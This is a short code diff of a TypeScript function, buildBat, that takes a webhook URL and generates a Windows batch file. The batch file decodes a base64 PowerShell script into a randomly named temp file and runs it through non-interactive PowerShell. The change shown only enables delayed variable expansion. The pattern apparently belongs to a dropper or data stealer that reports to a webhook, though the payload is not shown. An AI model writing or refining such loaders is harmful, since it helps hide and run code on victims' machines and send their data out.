@@ -6,7 +6,7 @@ export function buildBat(webhook: string): string {
   const b64 = Buffer.from(ps1, "utf8").toString("base64");
 
   return `@echo off
-setlocal
+setlocal enabledelayedexpansion
 set "_f=%TEMP%\\%RANDOM%%RANDOM%.ps1"
 powershell -NoLogo -NoProfile -NonInteractive -Command ^
   "[IO.File]::WriteAllBytes('!_f!',[Convert]::FromBase64String('${b64}'))"
